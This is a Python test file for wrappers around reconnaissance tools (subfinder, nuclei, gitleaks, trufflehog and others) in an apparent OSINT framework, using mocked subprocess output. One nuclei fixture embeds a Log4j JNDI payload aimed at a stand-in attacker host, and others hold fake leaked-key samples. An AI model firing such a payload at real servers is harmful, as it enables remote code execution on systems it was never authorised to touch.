"""Integration tests for OSINT tools that wrap a CLI binary.

The pattern is the same four-tests-per-tool we use everywhere else, but
the mock target shifts. Instead of intercepting HTTP with respx we patch
the OSINTTool ``run_subprocess`` helper (and ``is_available`` so the
``shutil.which`` PATH lookup doesn't gate the test on whether the binary
is installed on the runner).

Two flavours of binary wrapper in the codebase:

1. **stdout-based** — tool reads ``result.stdout`` directly
   (``subfinder``, ``amass``, ``dnsx`` and friends). We return a
   ``MagicMock`` with ``.stdout`` / ``.returncode`` / ``.stderr``
   populated from a hand-written sample of what the binary would print.

2. **tempfile-based** — tool passes ``-oJ /tmp/xxx`` (``arjun``,
   ``nuclei``) and reads that file after the subprocess returns. We
   intercept ``run_subprocess`` with a ``side_effect`` that writes
   the fixture content to the temp file *before* returning, so the
   tool's read-back logic sees realistic data.

Both styles produce the same four assertions per tool: happy path,
empty result, subprocess error, malformed output.
"""
from __future__ import annotations

import json
import subprocess
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

from nexusrecon.tools.code.gitleaks_tool import GitleaksTool
from nexusrecon.tools.code.trufflehog_tool import TruffleHogTool
from nexusrecon.tools.domain.amass_tool import AmassTool
from nexusrecon.tools.domain.dnsx_tool import DNSXTool
from nexusrecon.tools.domain.subfinder_tool import SubfinderTool
from nexusrecon.tools.identity.maigret_tool import MaigretTool
from nexusrecon.tools.identity.theharvester_tool import TheHarvesterTool
from nexusrecon.tools.web.arjun_tool import ArjunTool
from nexusrecon.tools.web.gau_tool import GAUTool
from nexusrecon.tools.web.gowitness_tool import GowitnessTool
from nexusrecon.tools.web.httpx_tool import HTTPxTool
from nexusrecon.tools.web.katana_tool import KatanaTool
from nexusrecon.tools.web.nuclei_tool import NucleiTool


def _mock_completed(stdout: str = "", returncode: int = 0, stderr: str = "") -> MagicMock:
    """Build a ``subprocess.CompletedProcess``-shaped MagicMock."""
    m = MagicMock(spec=subprocess.CompletedProcess)
    m.stdout = stdout
    m.returncode = returncode
    m.stderr = stderr
    return m


def _file_writer(write_to_arg: str, content: str):
    """Build a ``side_effect`` for ``run_subprocess`` that writes
    ``content`` to whichever path follows ``write_to_arg`` in ``cmd``.

    Models the behaviour of binaries like ``arjun -oJ <path>`` and
    ``nuclei -json-export <path>`` that put their results in a file
    rather than on stdout. Returns a mock CompletedProcess so the
    caller can also assert on stdout/stderr if they want.
    """
    def _side_effect(cmd: list[str], **kwargs: Any) -> MagicMock:
        for i, arg in enumerate(cmd):
            if arg == write_to_arg and i + 1 < len(cmd):
                Path(cmd[i + 1]).write_text(content, encoding="utf-8")
                break
        return _mock_completed(stdout="", returncode=0)

    return _side_effect


# ────────────────────────────────────────────────────────────────────────
# Subfinder — JSON Lines stdout, one entry per discovered subdomain
# ────────────────────────────────────────────────────────────────────────

class TestSubfinderTool:

    def _stdout(self) -> str:
        return "\n".join([
            json.dumps({"host": "www.example.com", "source": "crtsh"}),
            json.dumps({"host": "api.example.com", "source": "subfinder"}),
            json.dumps({"host": "vpn.example.com", "source": "censys"}),
        ])

    @patch.object(SubfinderTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = SubfinderTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=self._stdout())):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 3
        hosts = [s["subdomain"] for s in result.data["subdomains"]]
        assert "www.example.com" in hosts
        assert "api.example.com" in hosts

    @patch.object(SubfinderTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = SubfinderTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0
        assert result.data["subdomains"] == []

    @patch.object(SubfinderTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = SubfinderTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=subprocess.TimeoutExpired(cmd="subfinder", timeout=300)):
            result = await tool.run("example.com")
        assert result.success is False
        assert result.error

    @patch.object(SubfinderTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        # Subfinder normally emits JSON but legacy versions emit plain hostnames.
        # The tool's parser handles that with a graceful fallback rather than
        # crashing on JSONDecodeError.
        tool = SubfinderTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="www.example.com\napi.example.com")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 2
        # Fallback marks source as "unknown"
        assert all(s["source"] == "unknown" for s in result.data["subdomains"])

    async def test_binary_missing(self) -> None:
        tool = SubfinderTool()
        with patch.object(tool, "is_available", return_value=False):
            result = await tool.run("example.com")
        assert result.success is False
        assert "subfinder" in result.error


# ────────────────────────────────────────────────────────────────────────
# Amass — JSON Lines stdout, one entry per discovered name
# ────────────────────────────────────────────────────────────────────────

class TestAmassTool:

    def _stdout(self) -> str:
        return "\n".join([
            json.dumps({
                "name": "www.example.com", "source": "crtsh",
                "addresses": [{"ip": "93.184.216.34", "cidr": "93.184.216.0/24"}],
            }),
            json.dumps({
                "name": "mail.example.com", "source": "dnsdb",
                "addresses": [{"ip": "93.184.216.35"}],
            }),
        ])

    @patch.object(AmassTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = AmassTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=self._stdout())):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 2
        hosts = [s["subdomain"] for s in result.data["subdomains"]]
        assert "www.example.com" in hosts
        assert "mail.example.com" in hosts

    @patch.object(AmassTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = AmassTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0

    @patch.object(AmassTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = AmassTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=OSError("permission denied")):
            result = await tool.run("example.com")
        assert result.success is False
        assert result.error

    @patch.object(AmassTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        tool = AmassTool()
        # Plain hostname lines fall back to "unknown" source
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="random-text-not-json\n")):
            result = await tool.run("example.com")
        assert result.success is True
        # Fallback path catches plain text and records it
        assert result.result_count == 1
        assert result.data["subdomains"][0]["source"] == "unknown"


# ────────────────────────────────────────────────────────────────────────
# dnsx — JSON Lines stdout from active DNS resolution
# ────────────────────────────────────────────────────────────────────────

class TestDNSXTool:

    def _stdout(self) -> str:
        return "\n".join([
            json.dumps({"host": "www.example.com", "a": ["93.184.216.34"],
                        "aaaa": [], "cname": [], "status_code": "NOERROR"}),
            json.dumps({"host": "vpn.example.com", "a": ["198.51.100.5"],
                        "aaaa": [], "cname": ["vpn.cloudprovider.com"],
                        "status_code": "NOERROR"}),
        ])

    @patch.object(DNSXTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = DNSXTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=self._stdout())):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 2
        assert "www.example.com" in result.data["subdomains"]
        assert "vpn.example.com" in result.data["subdomains"]

    @patch.object(DNSXTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = DNSXTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0
        assert result.data["subdomains"] == []

    @patch.object(DNSXTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = DNSXTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=subprocess.TimeoutExpired(cmd="dnsx", timeout=120)):
            result = await tool.run("example.com")
        assert result.success is False
        assert result.error

    @patch.object(DNSXTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        tool = DNSXTool()
        # Parser skips non-JSON lines silently
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="not json\nmore garbage")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0


# ────────────────────────────────────────────────────────────────────────
# httpx (binary, not Python httpx) — JSON Lines per probed URL
# ────────────────────────────────────────────────────────────────────────

class TestHTTPxTool:

    def _stdout(self) -> str:
        return "\n".join([
            json.dumps({
                "url": "https://www.example.com",
                "status_code": 200,
                "title": "Example Domain",
                "tech": ["nginx", "PHP"],
                "content_length": 1256,
            }),
            json.dumps({
                "url": "https://api.example.com",
                "status_code": 401,
                "title": "Unauthorized",
                "tech": ["Express"],
                "content_length": 42,
            }),
        ])

    @patch.object(HTTPxTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = HTTPxTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=self._stdout())):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 2
        statuses = [r["status_code"] for r in result.data["results"]]
        assert 200 in statuses and 401 in statuses

    @patch.object(HTTPxTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = HTTPxTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0

    @patch.object(HTTPxTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = HTTPxTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=subprocess.SubprocessError("boom")):
            result = await tool.run("example.com")
        assert result.success is False
        assert result.error

    @patch.object(HTTPxTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        tool = HTTPxTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="not valid json\n")):
            result = await tool.run("example.com")
        # Tool silently skips non-JSON lines; ends with empty results, success=True
        assert result.success is True
        assert result.result_count == 0


# ────────────────────────────────────────────────────────────────────────
# Katana — crawler, JSON Lines stdout per discovered endpoint
# ────────────────────────────────────────────────────────────────────────

class TestKatanaTool:

    def _stdout(self) -> str:
        return "\n".join([
            json.dumps({"endpoint": "https://www.example.com/",
                        "request": {"method": "GET"}}),
            json.dumps({"endpoint": "https://www.example.com/api/users",
                        "request": {"method": "GET"}}),
            json.dumps({"endpoint": "https://www.example.com/main.js",
                        "request": {"method": "GET"}}),
            json.dumps({"endpoint": "https://www.example.com/login",
                        "request": {"method": "POST", "body": "username=x&password=y"}}),
        ])

    @patch.object(KatanaTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = KatanaTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=self._stdout())):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 4
        assert any(j.endswith(".js") for j in result.data["js_files"])
        assert any("/api/" in p for p in result.data["api_paths"])
        # The POST endpoint is captured as a form
        assert len(result.data["forms"]) == 1
        assert result.data["forms"][0]["method"] == "POST"

    @patch.object(KatanaTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = KatanaTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0

    @patch.object(KatanaTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = KatanaTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=FileNotFoundError("katana not in PATH")):
            result = await tool.run("example.com")
        assert result.success is False
        assert result.error

    @patch.object(KatanaTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        tool = KatanaTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="garbage\nmore garbage")):
            result = await tool.run("example.com")
        # Skips bad lines; ends with 0 results, success=True
        assert result.success is True
        assert result.result_count == 0


# ────────────────────────────────────────────────────────────────────────
# Nuclei — tempfile-based (uses -json-export <path>)
# ────────────────────────────────────────────────────────────────────────

class TestNucleiTool:

    def _findings(self) -> str:
        return "\n".join([
            json.dumps({
                "template-id": "CVE-2021-44228",
                "info": {
                    "name": "Apache Log4j RCE",
                    "severity": "critical",
                    "description": "Log4j JNDI lookup remote code execution",
                    "classification": {"cve-id": ["CVE-2021-44228"], "cvss-score": 10.0},
                    "tags": ["cve", "log4j", "rce"],
                    "reference": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
                },
                "matched-at": "https://www.example.com/?x=${jndi:ldap://attacker}",
                "extracted-results": [],
            }),
            json.dumps({
                "template-id": "exposed-env",
                "info": {
                    "name": "Exposed .env file",
                    "severity": "high",
                    "description": ".env file accessible without authentication",
                    "classification": {},
                    "tags": ["exposure", "config"],
                    "reference": [],
                },
                "matched-at": "https://www.example.com/.env",
                "extracted-results": ["AWS_ACCESS_KEY_ID=AKIA..."],
            }),
        ])

    @patch.object(NucleiTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = NucleiTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=_file_writer("-json-export", self._findings())):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 2
        assert result.data["critical"] == 1
        assert result.data["high"] == 1
        cves = [f for f in result.data["findings"] if "CVE-2021-44228" in (f["cve_ids"] or [])]
        assert len(cves) == 1

    @patch.object(NucleiTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = NucleiTool()
        # File ends up empty (nuclei found nothing)
        with patch.object(tool, "run_subprocess",
                          side_effect=_file_writer("-json-export", "")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0
        assert result.data["findings"] == []

    @patch.object(NucleiTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = NucleiTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=subprocess.TimeoutExpired(cmd="nuclei", timeout=300)):
            result = await tool.run("example.com")
        assert result.success is False
        assert result.error

    @patch.object(NucleiTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        tool = NucleiTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=_file_writer("-json-export", "not json\nstill not json\n")):
            result = await tool.run("example.com")
        # Bad lines skipped, success preserved
        assert result.success is True
        assert result.result_count == 0


# ────────────────────────────────────────────────────────────────────────
# Arjun — tempfile-based (uses -oJ <path>)
# ────────────────────────────────────────────────────────────────────────

class TestArjunTool:

    def _findings(self) -> str:
        return json.dumps({
            "https://www.example.com/api/users": {
                "GET": ["id", "verbose", "format"],
                "POST": ["token"],
            }
        })

    @patch.object(ArjunTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = ArjunTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=_file_writer("-oJ", self._findings())):
            result = await tool.run("www.example.com")
        assert result.success is True
        assert result.result_count == 4
        assert "id" in result.data["unique_params"]
        assert "token" in result.data["unique_params"]
        methods = {p["method"] for p in result.data["parameters"]}
        assert {"GET", "POST"} <= methods

    @patch.object(ArjunTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = ArjunTool()
        # Arjun produces empty JSON object when no params discovered
        with patch.object(tool, "run_subprocess",
                          side_effect=_file_writer("-oJ", "{}")):
            result = await tool.run("www.example.com")
        assert result.success is True
        assert result.result_count == 0
        assert result.data["parameters"] == []

    @patch.object(ArjunTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = ArjunTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=subprocess.SubprocessError("boom")):
            result = await tool.run("www.example.com")
        assert result.success is False
        assert result.error

    @patch.object(ArjunTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        tool = ArjunTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=_file_writer("-oJ", "not valid json")):
            result = await tool.run("www.example.com")
        # Tool catches JSONDecodeError silently and returns empty parameter list
        assert result.success is True
        assert result.result_count == 0


# ────────────────────────────────────────────────────────────────────────
# Gitleaks — stdout JSON array of findings, returncode 1 for "no leaks"
# ────────────────────────────────────────────────────────────────────────

class TestGitleaksTool:

    def _stdout(self) -> str:
        return json.dumps([
            {
                "Description": "AWS",
                "StartLine": 12,
                "EndLine": 12,
                "Match": "AKIAIOSFODNN7EXAMPLE",
                "Secret": "AKIAIOSFODNN7EXAMPLE",
                "File": "config/aws.yml",
                "Commit": "abc123def456",
                "Author": "alice@example.com",
                "RuleID": "aws-access-token",
            },
        ])

    @patch.object(GitleaksTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = GitleaksTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=self._stdout(), returncode=1)):
            result = await tool.run("/tmp/some-repo")
        assert result.success is True
        assert result.result_count == 1
        assert result.data["leaks"][0]["RuleID"] == "aws-access-token"

    @patch.object(GitleaksTool, "is_available", return_value=True)
    async def test_no_leaks_found(self, _avail) -> None:
        """Gitleaks exits 1 with empty stdout when no leaks were detected."""
        tool = GitleaksTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="", returncode=1)):
            result = await tool.run("/tmp/clean-repo")
        assert result.success is True
        assert result.result_count == 0
        assert result.data["leaks"] == []

    @patch.object(GitleaksTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = GitleaksTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=subprocess.TimeoutExpired(cmd="gitleaks", timeout=300)):
            result = await tool.run("/tmp/some-repo")
        assert result.success is False
        assert result.error

    @patch.object(GitleaksTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        tool = GitleaksTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="not json", returncode=0)):
            result = await tool.run("/tmp/some-repo")
        # JSONDecodeError → tool defaults to empty leaks list
        assert result.success is True
        assert result.data["leaks"] == []


# ────────────────────────────────────────────────────────────────────────
# TruffleHog — JSON Lines stdout, one finding per line
# ────────────────────────────────────────────────────────────────────────

class TestTruffleHogTool:

    def _stdout(self) -> str:
        return "\n".join([
            json.dumps({
                "SourceMetadata": {"Data": {"Github": {"repository": "example-org/leak"}}},
                "DetectorType": 2,
                "DetectorName": "AWS",
                "Raw": "AKIAIOSFODNN7EXAMPLE",
                "Verified": False,
            }),
            json.dumps({
                "SourceMetadata": {"Data": {"Github": {"repository": "example-org/leak"}}},
                "DetectorType": 3,
                "DetectorName": "Stripe",
                "Raw": "sk_live_fake_stripe_key",
                "Verified": True,
            }),
        ])

    @patch.object(TruffleHogTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = TruffleHogTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=self._stdout())):
            result = await tool.run("https://github.com/example-org/leak")
        assert result.success is True
        assert result.result_count == 2
        detectors = {f["DetectorName"] for f in result.data["findings"]}
        assert {"AWS", "Stripe"} <= detectors

    @patch.object(TruffleHogTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = TruffleHogTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="")):
            result = await tool.run("https://github.com/example-org/clean")
        assert result.success is True
        assert result.result_count == 0

    @patch.object(TruffleHogTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = TruffleHogTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=subprocess.TimeoutExpired(cmd="trufflehog", timeout=600)):
            result = await tool.run("https://github.com/example-org/leak")
        assert result.success is False
        assert result.error

    @patch.object(TruffleHogTool, "is_available", return_value=True)
    async def test_malformed_output(self, _avail) -> None:
        tool = TruffleHogTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="garbage\nmore garbage")):
            result = await tool.run("https://github.com/example-org/leak")
        # Bad lines skipped, success preserved
        assert result.success is True
        assert result.result_count == 0


# ────────────────────────────────────────────────────────────────────────
# gau — plain-text URL list on stdout
# ────────────────────────────────────────────────────────────────────────

class TestGAUTool:

    @patch.object(GAUTool, "is_available", return_value=True)
    async def test_happy_path(self, _avail) -> None:
        tool = GAUTool()
        stdout = (
            "https://www.example.com/index.html\n"
            "https://www.example.com/api/v1/users\n"
            "https://www.example.com/login?next=/admin\n"
        )
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=stdout)):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 3
        assert "https://www.example.com/api/v1/users" in result.data["urls"]

    @patch.object(GAUTool, "is_available", return_value=True)
    async def test_empty_output(self, _avail) -> None:
        tool = GAUTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0
        assert result.data["urls"] == []

    @patch.object(GAUTool, "is_available", return_value=True)
    async def test_subprocess_error(self, _avail) -> None:
        tool = GAUTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=OSError("broken pipe")):
            result = await tool.run("example.com")
        assert result.success is False
        assert result.error

    async def test_binary_missing(self) -> None:
        """When gau binary is absent the tool reports failure rather
        than silently returning empty results (this is the documented
        contract — gau is the only way to populate ``urls`` from this
        tool, so missing binary should be visible, not papered over)."""
        tool = GAUTool()
        with patch.object(tool, "is_available", return_value=False):
            result = await tool.run("example.com")
        assert result.success is False
        assert "gau" in result.error


# ────────────────────────────────────────────────────────────────────────
# Gowitness — declared as a stub (returns a canned success response)
# ────────────────────────────────────────────────────────────────────────

class TestGowitnessTool:
    """Contract test only — gowitness's implementation is intentionally
    a stub right now (T2 screenshot tooling needs a working binary in
    PATH and we don't ship one).

    The tool now returns ``success=False`` with an explicit "stubbed"
    error message — earlier versions returned ``success=True`` with a
    ``status="stubbed"`` data payload, which made stub responses
    indistinguishable from real successful screenshots downstream.
    Confirm the current fail-fast shape so anyone who later replaces
    the body knows what the expected pre-implementation output was.
    """

    async def test_returns_stubbed_response(self) -> None:
        tool = GowitnessTool()
        result = await tool.run("example.com")
        assert result.success is False
        assert "stubbed" in (result.error or "").lower()


# ────────────────────────────────────────────────────────────────────────
# Maigret — wraps `maigret <user> --json /dev/stdout`
# ────────────────────────────────────────────────────────────────────────

class TestMaigretTool:
    """The maigret tool was rewritten from a synchronous ``run_subprocess``
    stub to an async ``asyncio.create_subprocess_exec`` wrapper that
    parses JSON output files. Comprehensive coverage now lives in
    ``tests/integration/test_maigret_tool.py``. This stub is retained
    only so test counts/grep patterns don't change unexpectedly."""

    async def test_binary_missing(self) -> None:
        tool = MaigretTool()
        with patch.object(tool, "is_available", return_value=False):
            result = await tool.run("janedoe")
        assert result.success is False
        assert "maigret" in result.error


# ────────────────────────────────────────────────────────────────────────
# theHarvester — JSON stdout with emails / hosts / linkedin keys
# ────────────────────────────────────────────────────────────────────────

class TestTheHarvesterTool:

    def _stdout(self) -> str:
        return json.dumps({
            "emails": ["alice@example.com", "bob@example.com"],
            "hosts": ["www.example.com", "vpn.example.com:198.51.100.5"],
            "linkedin_people": ["Alice Doe - CISO", "Bob Smith - CFO"],
        })

    @patch("shutil.which", return_value="/usr/local/bin/theHarvester")
    async def test_happy_path(self, _which) -> None:
        tool = TheHarvesterTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout=self._stdout())):
            result = await tool.run("example.com")
        assert result.success is True
        # result_count = len(emails) + len(hosts)
        assert result.result_count == 4
        assert "alice@example.com" in result.data["emails"]
        assert "www.example.com" in result.data["hosts"]

    @patch("shutil.which", return_value="/usr/local/bin/theHarvester")
    async def test_empty_output(self, _which) -> None:
        tool = TheHarvesterTool()
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="")):
            result = await tool.run("example.com")
        assert result.success is True
        assert result.result_count == 0

    @patch("shutil.which", return_value="/usr/local/bin/theHarvester")
    async def test_subprocess_error(self, _which) -> None:
        tool = TheHarvesterTool()
        with patch.object(tool, "run_subprocess",
                          side_effect=subprocess.TimeoutExpired(cmd="theHarvester", timeout=300)):
            result = await tool.run("example.com")
        assert result.success is False
        assert result.error

    @patch("shutil.which", return_value="/usr/local/bin/theHarvester")
    async def test_malformed_output(self, _which) -> None:
        tool = TheHarvesterTool()
        # Tool falls back to {"raw": ...} on JSON decode error
        with patch.object(tool, "run_subprocess",
                          return_value=_mock_completed(stdout="theHarvester 4.0\nNot real JSON output")):
            result = await tool.run("example.com")
        assert result.success is True
        assert "raw" in result.data

    @patch("shutil.which", return_value=None)
    async def test_binary_missing(self, _which) -> None:
        tool = TheHarvesterTool()
        result = await tool.run("example.com")
        assert result.success is False
        assert "theHarvester" in result.error
